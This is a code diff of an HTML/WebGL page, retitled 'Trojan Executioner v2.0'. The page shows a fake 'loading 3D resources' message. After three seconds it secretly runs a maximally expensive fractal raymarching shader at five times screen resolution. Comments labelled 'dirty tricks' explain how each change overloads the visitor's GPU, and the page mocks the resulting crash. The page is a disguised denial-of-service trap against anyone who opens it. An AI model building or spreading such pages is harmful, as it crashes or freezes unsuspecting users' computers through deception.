@@ -2,130 +2,262 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ADev Vĩ - The RTX Executioner</title>
+    <title>ADev Vĩ - Trojan Executioner v2.0</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #000; }
+        body { margin: 0; background: #000; overflow: hidden; font-family: monospace; }
         canvas { width: 100vw; height: 100vh; display: block; }
-        #overlay {
-            position: absolute; top: 10px; left: 10px; 
-            color: #00ff00; font-family: monospace; font-size: 16px; 
-            text-shadow: 0 0 5px #000; pointer-events: none; z-index: 10;
-            background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px;
+        #ui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; pointer-events: none; z-index: 10; width: 100%; }
+        #fps-box { position: absolute; top: 15px; left: 15px; color: #00ff00; font-size: 28px; font-weight: bold; text-shadow: 2px 2px 5px #000; z-index: 10; }
+        
+        #fake-loading { color: #00ffaa; font-size: 24px; text-shadow: 0 0 10px #00ffaa; }
+        
+        #trap-msg { display: none; color: #ff0000; font-size: 50px; font-weight: bold; text-shadow: 0 0 40px #ff0000; animation: shake 0.3s infinite; }
+        @keyframes shake {
+            0% { transform: translate(2px, 2px) rotate(0deg); }
+            10% { transform: translate(-2px, -3px) rotate(-2deg); }
+            20% { transform: translate(-4px, 0px) rotate(2deg); }
+            30% { transform: translate(4px, 3px) rotate(0deg); }
+            40% { transform: translate(2px, -2px) rotate(2deg); }
+            50% { transform: translate(-2px, 3px) rotate(-2deg); }
+            60% { transform: translate(-4px, 2px) rotate(0deg); }
+            70% { transform: translate(4px, 2px) rotate(-2deg); }
+            80% { transform: translate(-2px, -2px) rotate(2deg); }
+            90% { transform: translate(2px, 3px) rotate(0deg); }
+            100% { transform: translate(2px, -3px) rotate(-2deg); }
         }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 </head>
 <body>
-    <div id="overlay">
-        [ADev Vĩ] GPU Executioner Mode<br>
-        Status: <span id="status">Initializing...</span><br>
-        <span id="fps" style="color: yellow; font-size: 24px; font-weight: bold;">FPS: --</span><br>
-        <small>Tip: Press F11 for Full Stress</small>
+    <div id="fps-box">FPS: 0</div>
+    <div id="ui">
+        <div id="fake-loading">Đang tải tài nguyên 3D... (Vui lòng đợi)</div>
+        <div id="trap-msg">KÍCH HOẠT ÁN TỬ!!!<br><span style="font-size: 20px; color: #ff8800;">RTX 4060 MELTDOWN IN PROGRESS</span></div>
     </div>
-    <script>
-        // Bắt đầu với mức 1.0 để tránh lỗi "Error creating WebGL context"
-        let currentScale = 1.0; 
+    <canvas id="c"></canvas>
 
-        const vertexShader = `
-            varying vec2 vUv;
-            void main() {
-                vUv = uv;
-                gl_Position = vec4(position, 1.0);
-            }
+<script>
+    const canvas = document.getElementById("c");
+    const gl = canvas.getContext("webgl2");
+
+    canvas.addEventListener("webglcontextlost", (e) => {
+        e.preventDefault();
+        document.getElementById("trap-msg").innerHTML = "💀 GPU ĐÃ ĐẮP CHIẾU 💀<br><small>Windows đã ngắt điện để cứu máy!</small>";
+        document.getElementById("fps-box").innerText = "SYSTEM CRASH";
+        document.getElementById("fps-box").style.color = "red";
+    }, false);
+
+    if (gl) {
+        const vsSource = `#version 300 es
+            in vec2 position;
+            void main() { gl_Position = vec4(position, 0.0, 1.0); }
         `;
 
-        const fragmentShader = `
+        const fsSource = `#version 300 es
+            precision highp float;
             uniform float time;
             uniform vec2 resolution;
-            
-            float map(vec3 p) {
-                p.xz *= mat2(cos(time*0.3), sin(time*0.3), -sin(time*0.3), cos(time*0.3));
-                vec3 q = p;
-                float s = 1.0;
-                for(int i = 0; i < 10; i++) {
-                    p = abs(p) - vec3(0.4, 1.2, 0.4);
-                    float r2 = dot(p, p);
-                    float k = 1.3 / clamp(r2, 0.1, 1.0);
-                    p *= k;
-                    s *= k;
+            uniform float unleash; 
+            out vec4 fragColor;
+
+            mat2 rot(float a) { return mat2(cos(a), sin(a), -sin(a), cos(a)); }
+
+            float GetDist(vec3 p) {
+                // ĐÒN HIỂM 1: Phá vỡ định luật không gian (SDF Corruption)
+                // Ép GPU không thể nhảy cóc, phải tính toán từng pixel li ti
+                if (unleash > 0.5) {
+                    p += sin(p.zxy * 5.0 + time * 2.0) * 0.015;
                 }
-                return length(p) / s;
+
+                vec3 z = p;
+                float dr = 1.0;
+                float r = 0.0;
+                
+                // Tăng lên 20 vòng lặp Fractal lồng nhau
+                int max_iter = (unleash > 0.5) ? 20 : 4; 
+                
+                for (int i = 0; i < 20; i++) {
+                    if (i >= max_iter) break;
+                    r = length(z);
+                    if (r > 2.0) break;
+                    
+                    if (unleash > 0.5) {
+                        z.xy *= rot(time * 0.05);
+                        z.xz *= rot(time * 0.08);
+                    }
+
+                    float theta = acos(z.z / r) * 8.0;
+                    float phi = atan(z.y, z.x) * 8.0;
+                    dr = pow(r, 7.0) * 8.0 * dr + 1.0;
+                    
+                    float zr = pow(r, 8.0);
+                    z = zr * vec3(sin(theta)*cos(phi), sin(theta)*sin(phi), cos(theta)) + p;
+                }
+                return 0.5 * log(r) * r / dr;
+            }
+
+            vec3 GetNormal(vec3 p) {
+                vec2 e = vec2(0.001, 0);
+                return normalize(vec3(
+                    GetDist(p + e.xyy) - GetDist(p - e.xyy),
+                    GetDist(p + e.yxy) - GetDist(p - e.yxy),
+                    GetDist(p + e.yyx) - GetDist(p - e.yyx)
+                ));
+            }
+
+            // ĐÒN HIỂM 2: Ambient Occlusion (Tính hốc tối)
+            float CalcAO(vec3 p, vec3 n) {
+                if(unleash < 0.5) return 1.0;
+                float occ = 0.0;
+                float sca = 1.0;
+                for(int i = 0; i < 5; i++) {
+                    float h = 0.01 + 0.12 * float(i) / 4.0;
+                    float d = GetDist(p + h * n);
+                    occ += (h - d) * sca;
+                    sca *= 0.75;
+                }
+                return clamp(1.0 - 2.0 * occ, 0.0, 1.0);
+            }
+
+            float SoftShadow(vec3 ro, vec3 rd) {
+                if (unleash < 0.5) return 1.0; 
+                float res = 1.0;
+                float t = 0.02;
+                // Ép vòng lặp bóng đổ lên 60 lần thay vì 40
+                for(int i = 0; i < 60; i++) {
+                    float h = GetDist(ro + rd * t);
+                    res = min(res, 8.0 * h / t);
+                    t += clamp(h, 0.01, 0.05);
+                    if(h < 0.0001 || t > 4.0) break;
+                }
+                return clamp(res, 0.0, 1.0);
             }
 
             void main() {
                 vec2 uv = (gl_FragCoord.xy - 0.5 * resolution.xy) / resolution.y;
-                vec3 ro = vec3(0.0, 0.0, -3.5);
-                vec3 rd = normalize(vec3(uv, 1.2));
-                float t = 0.0;
-                int i;
-                for(i = 0; i < 100; i++) {
-                    float d = map(ro + rd * t);
-                    if(d < 0.001 || t > 20.0) break;
-                    t += d;
+                
+                vec3 ro = vec3(0.0, 0.0, -2.8);
+                float s = sin(time*0.2), c = cos(time*0.2);
+                ro.xz *= mat2(c, -s, s, c);
+                vec3 rd = normalize(vec3(uv.x, uv.y, 1.0));
+                rd.xz *= mat2(c, -s, s, c);
+
+                vec3 col = vec3(0.0);
+                vec3 cur_ro = ro;
+                vec3 cur_rd = rd;
+                vec3 refCol = vec3(1.0);
+
+                int bounces = (unleash > 0.5) ? 2 : 1; 
+                // Ép Raymarching cày 400 bước cho mỗi pixel!
+                int steps = (unleash > 0.5) ? 400 : 80;
+
+                for(int bounce = 0; bounce < 2; bounce++) {
+                    if (bounce >= bounces) break;
+                    
+                    float d0 = 0.0;
+                    vec3 p;
+                    
+                    for(int i = 0; i < 400; i++) {
+                        if (i >= steps) break;
+                        p = cur_ro + cur_rd * d0;
+                        float dS = GetDist(p);
+                        d0 += dS;
+                        if(d0 > 12.0 || dS < 0.001) break;
+                    }
+
+                    if(d0 < 12.0) {
+                        vec3 n = GetNormal(p);
+                        vec3 l1 = normalize(vec3(2.0 * sin(time), 3.0, -2.0 * cos(time)) - p);
+                        
+                        float dif1 = max(dot(n, l1), 0.0) * SoftShadow(p, l1);
+                        vec3 matCol = vec3(0.2, 0.8, 1.0) * dif1; 
+                        
+                        if (unleash > 0.5) {
+                            vec3 l2 = normalize(vec3(-2.0, -1.0, 2.0) - p);
+                            float dif2 = max(dot(n, l2), 0.0) * SoftShadow(p, l2);
+                            float ao = CalcAO(p, n); // Gọi Ambient Occlusion
+                            
+                            matCol += vec3(1.0, 0.1, 0.2) * dif2;
+                            matCol *= ao; // Trộn hốc tối để hình ảnh cực kỳ gai góc
+                        }
+
+                        col += refCol * matCol;
+                        refCol *= vec3(0.3, 0.4, 0.5); 
+                        cur_ro = p + n * 0.005;
+                        cur_rd = reflect(cur_rd, n);
+                    } else {
+                        col += refCol * vec3(0.02, 0.02, 0.05);
+                        break;
+                    }
                 }
-                vec3 col = vec3(float(i)/100.0);
-                col *= vec3(0.1, 0.4, 1.0) * (sin(t * 2.0 + time) * 0.5 + 0.5);
-                gl_FragColor = vec4(pow(col, vec3(0.4545)), 1.0);
+
+                col = pow(col, vec3(0.4545));
+                fragColor = vec4(col, 1.0);
             }
         `;
 
-        let renderer, scene, camera, uniforms;
+        function compileShader(type, source) {
+            const shader = gl.createShader(type);
+            gl.shaderSource(shader, source);
+            gl.compileShader(shader);
+            return shader;
+        }
 
-        function init() {
-            try {
-                scene = new THREE.Scene();
-                camera = new THREE.OrthographicCamera(-1, 1, 1, -1, 0, 1);
+        const prog = gl.createProgram();
+        gl.attachShader(prog, compileShader(gl.VERTEX_SHADER, vsSource));
+        gl.attachShader(prog, compileShader(gl.FRAGMENT_SHADER, fsSource));
+        gl.linkProgram(prog); gl.useProgram(prog);
+
+        const buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);
+        const posAttr = gl.getAttribLocation(prog, "position");
+        gl.enableVertexAttribArray(posAttr); gl.vertexAttribPointer(posAttr, 2, gl.FLOAT, false, 0, 0);
+
+        const timeUnif = gl.getUniformLocation(prog, "time");
+        const resUnif = gl.getUniformLocation(prog, "resolution");
+        const unleashUnif = gl.getUniformLocation(prog, "unleash");
+
+        let frames = 0, lastTime = performance.now();
+        const fpsEl = document.getElementById('fps-box');
+        
+        let isUnleashed = false;
+        let renderScale = 0.5; 
+        let startTime = performance.now();
+
+        function render(now) {
+            if (!isUnleashed && now - startTime > 3000) {
+                isUnleashed = true;
+                // ĐÒN HIỂM 3: ÉP RENDER SCALE TỪ 4.0 LÊN 5.0 (Tương đương độ phân giải 10K+)
+                renderScale = 5.0; 
                 
-                // Thêm thuộc tính failIfMajorPerformanceCaveat để tránh treo máy
-                renderer = new THREE.WebGLRenderer({ 
-                    antialias: false,
-                    failIfMajorPerformanceCaveat: false 
-                });
+                document.getElementById('fake-loading').style.display = "none";
+                document.getElementById('trap-msg').style.display = "block";
+                fpsEl.style.color = "red";
                 
-                renderer.setPixelRatio(window.devicePixelRatio * currentScale);
-                renderer.setSize(window.innerWidth, window.innerHeight);
-                document.body.appendChild(renderer.domElement);
-
-                uniforms = {
-                    time: { value: 0 },
-                    resolution: { value: new THREE.Vector2() }
-                };
-
-                const material = new THREE.ShaderMaterial({ uniforms, vertexShader, fragmentShader });
-                scene.add(new THREE.Mesh(new THREE.PlaneGeometry(2, 2), material));
-
-                updateRes();
-                document.getElementById('status').innerText = "Running (Safe Mode)";
-                animate();
-            } catch (e) {
-                document.getElementById('status').innerText = "WebGL Error: " + e.message;
-                console.error(e);
+                canvas.width = window.innerWidth * renderScale;
+                canvas.height = window.innerHeight * renderScale;
             }
-        }
 
-        function updateRes() {
-            const w = window.innerWidth * window.devicePixelRatio * currentScale;
-            const h = window.innerHeight * window.devicePixelRatio * currentScale;
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            uniforms.resolution.value.set(w, h);
-        }
+            if (canvas.width !== window.innerWidth * renderScale || canvas.height !== window.innerHeight * renderScale) {
+                canvas.width = window.innerWidth * renderScale;
+                canvas.height = window.innerHeight * renderScale;
+            }
+            gl.viewport(0, 0, canvas.width, canvas.height);
 
-        let frames = 0, prevTime = performance.now();
-        function animate(t) {
-            uniforms.time.value = t / 1000;
-            renderer.render(scene, camera);
+            gl.uniform1f(timeUnif, now * 0.001);
+            gl.uniform2f(resUnif, canvas.width, canvas.height);
+            gl.uniform1f(unleashUnif, isUnleashed ? 1.0 : 0.0);
+
+            gl.drawArrays(gl.TRIANGLES, 0, 6);
+
             frames++;
-            let now = performance.now();
-            if (now - prevTime >= 1000) {
-                document.getElementById('fps').innerText = "FPS: " + frames;
-                frames = 0;
-                prevTime = now;
+            if (now - lastTime >= 1000) {
+                fpsEl.innerText = "FPS: " + frames;
+                frames = 0; lastTime = now;
             }
-            requestAnimationFrame(animate);
+            requestAnimationFrame(render);
         }
-
-        window.addEventListener('resize', updateRes);
-        window.onload = init;
-    </script>
+        requestAnimationFrame(render);
+    }
+</script>
 </body>
 </html>
